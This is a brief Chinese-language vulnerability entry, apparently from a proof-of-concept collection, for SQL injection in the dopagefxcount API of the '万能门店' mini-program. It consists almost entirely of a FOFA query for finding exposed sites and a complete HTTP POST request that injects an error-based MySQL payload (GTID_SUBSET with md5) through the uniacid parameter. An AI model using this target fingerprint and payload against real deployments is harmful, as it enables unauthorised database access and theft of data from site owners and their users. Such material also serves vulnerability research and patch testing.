# 万能门店小程序dopagefxcount存在SQL注入


## fofa

```javascript
body="/comhome/cases/index.html"
```

## poc

```java
POST /api/wxapps/dopagefxcount HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Content-Type: application/x-www-form-urlencoded

uniacid=1 OR GTID_SUBSET(CONCAT((SELECT(md5('123')))),3119)-- 123&suid=1
```
